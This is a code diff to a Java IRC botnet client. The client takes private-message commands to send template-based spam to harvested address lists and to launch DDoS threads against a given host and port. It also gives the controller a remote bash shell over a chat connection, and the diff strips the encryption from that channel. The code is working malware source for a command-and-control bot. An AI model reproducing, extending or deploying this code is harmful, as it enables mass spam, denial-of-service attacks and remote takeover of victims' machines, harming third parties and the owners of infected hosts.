@@ -37,8 +37,8 @@ public class BotnetClient extends PircBot {
 	(byte)0xee, (byte)0x80, (byte)032, (byte)0x9d, (byte)0xb8, (byte)0xb1, (byte)0x47, 
 	(byte)0x65, (byte)0xa1, (byte)0xd0, (byte)0x01};
 
-	private Key startKey;
-	//private Cipher startCipher;
+	private SecretKeySpec startKey;
+	private Cipher startCipher;
 	private MsgEncrypt startMsgE;
 	
 	private Key privKey;
@@ -48,7 +48,6 @@ public class BotnetClient extends PircBot {
 	}
 	
 	public BotnetClient() {
-		//MsgEncrypt cipher = MsgEncrypt.getInstance(key, secretKey);
 		uuid = UUID.randomUUID().toString();
 		id = NAME + "_" + uuid;
 		try {
@@ -58,9 +57,9 @@ public class BotnetClient extends PircBot {
 			connect(SERVER, PORT);
 			sendEmail("shakalandro@gmail.com", new String[] {"shakalandro@gmail.com"}, "works", "sweetness");
 			
-			startKey = new SecretKeySpec(key, "DESede");
-			//startCipher = Cipher.getInstance("AES");
-			//startCipher.init(Cipher.DECRYPT_MODE, startKey);
+			startKey = new SecretKeySpec(key, "AES");
+			startCipher = Cipher.getInstance("AES");
+			startCipher.init(Cipher.DECRYPT_MODE, startKey);
 			startMsgE = MsgEncrypt.getInstance(startKey);
 		} catch (NickAlreadyInUseException e) {
 			uuid = UUID.randomUUID().toString();
@@ -94,54 +93,48 @@ public class BotnetClient extends PircBot {
 	}
 		
 	protected void onPrivateMessage(String sender, String login, String hostname, String message) {
-		try {
-			// TODO: maybe need to put this back
-			message = startMsgE.decryptMsg(message);
-			if (message.toLowerCase().startsWith("spam")) {
-				String[] parts = message.split(" ");
-				if (parts.length < 8) {
-					System.out.println("bad spam message");
-				} else {
-					String x = parts[1];
-					String y = parts[2];
-					String z = parts[3];
-					String from = parts[4];
-					String subject = parts[5];
-					String[] to;
-					if (parts[6].toLowerCase().equals("random")) {
-						to = getEmails(RANDOM_EMAILS);
-					} else if (parts[6].toLowerCase().equals("all")) {
-						to = getEmails(EMAILS);
-					} else {
-						to = Arrays.copyOfRange(parts, 6, parts.length);
-					}
-					String body = "";
-					try {
-						Scanner in = new Scanner(new File(TEMPLATE));
-						while (in.hasNextLine()) {
-							body += in.nextLine() + "\r\n";
-						}
-					} catch (Exception e) {
-						System.out.println("There were problems reading " + TEMPLATE);
-					}
-					body = body.replace("XXX", x).replace("YYY", y).replace("ZZZ", z);
-					sendEmail(from, to, subject, body);
-				}
-			} else if (message.toLowerCase().startsWith("ddos")) {
-				System.out.println(sender + ": " + message);
-				String[] parts = message.split(" ");
-				if (parts.length < 4) {
-					System.out.println("Bad ddos message provided");
-				} else {
-					DdosThread ddos = new DdosThread(parts[1], Integer.parseInt(parts[2]), Integer.parseInt(parts[3]));
-				}
-			} else if (message.toLowerCase().startsWith("lease")) {
-				System.out.println("Leasing Myself");
+		if (message.toLowerCase().startsWith("spam")) {
+			String[] parts = message.split(" ");
+			if (parts.length < 8) {
+				System.out.println("bad spam message");
 			} else {
-				System.out.println(sender + "<" + hostname + "> tried to use me with (" + message + ")");
+				String x = parts[1];
+				String y = parts[2];
+				String z = parts[3];
+				String from = parts[4];
+				String subject = parts[5];
+				String[] to;
+				if (parts[6].toLowerCase().equals("random")) {
+					to = getEmails(RANDOM_EMAILS);
+				} else if (parts[6].toLowerCase().equals("all")) {
+					to = getEmails(EMAILS);
+				} else {
+					to = Arrays.copyOfRange(parts, 6, parts.length);
+				}
+				String body = "";
+				try {
+					Scanner in = new Scanner(new File(TEMPLATE));
+					while (in.hasNextLine()) {
+						body += in.nextLine() + "\r\n";
+					}
+				} catch (Exception e) {
+					System.out.println("There were problems reading " + TEMPLATE);
+				}
+				body = body.replace("XXX", x).replace("YYY", y).replace("ZZZ", z);
+				sendEmail(from, to, subject, body);
 			}
-		} catch (Exception e) {
-			System.out.println("There was problems decrypting the message");
+		} else if (message.toLowerCase().startsWith("ddos")) {
+			System.out.println(sender + ": " + message);
+			String[] parts = message.split(" ");
+			if (parts.length < 4) {
+				System.out.println("Bad ddos message provided");
+			} else {
+				DdosThread ddos = new DdosThread(parts[1], Integer.parseInt(parts[2]), Integer.parseInt(parts[3]));
+			}
+		} else if (message.toLowerCase().startsWith("lease")) {
+			System.out.println("Leasing Myself");
+		} else {
+			System.out.println(sender + "<" + hostname + "> tried to use me with (" + message + ")");
 		}
 	}
 	
@@ -228,10 +221,7 @@ public class BotnetClient extends PircBot {
 	        		while (inputThread.isAlive()) {
 	        			String s = bashout.readLine();
 	        			while (s != null && !s.equals(SENTINEL)) {
-	        				// TODO: maybe need to change this
-	        				String encS = startMsgE.encryptMsg(s);
-	        				chat.sendLine(encS);
-	        				//chat.sendLine(s);
+	        				chat.sendLine(s);
 	        				System.out.println("bash response: " + s);
 	        				s = bashout.readLine();
 	        			}
@@ -316,18 +306,16 @@ public class BotnetClient extends PircBot {
 	    	try {
 	    		bashin.println("echo `pwd` '$: '");
 		    	// TODO: make decrypted
-	    		String encCommand = chat.readLine();
-	    		String command = startMsgE.decryptMsg(encCommand);
-	    		System.out.println(encCommand);
-	    		System.out.println(command);
-	    		//String command = chat.readLine();
+	    		//String encCommand = chat.readLine();
+	    		//String command = startMsgE.decryptMsg(encCommand);
+	    		String command = chat.readLine();
 	        	while (command != null && !command.equalsIgnoreCase(TERMINATION) && !terminate) {
 	        		System.out.println("command: " + command);
 	        		bashin.println(command);
 	        		bashin.println("echo `pwd` '$: '");
-	        		//command = chat.readLine();
-	        		encCommand = chat.readLine();
-	        		command = startMsgE.decryptMsg(encCommand);
+	        		command = chat.readLine();
+	        		//encCommand = chat.readLine();
+	        		//command = startMsgE.decryptMsg(encCommand);
 	        	}
 	        	bashin.println("exit 0");
 	    	} catch (Exception e) {
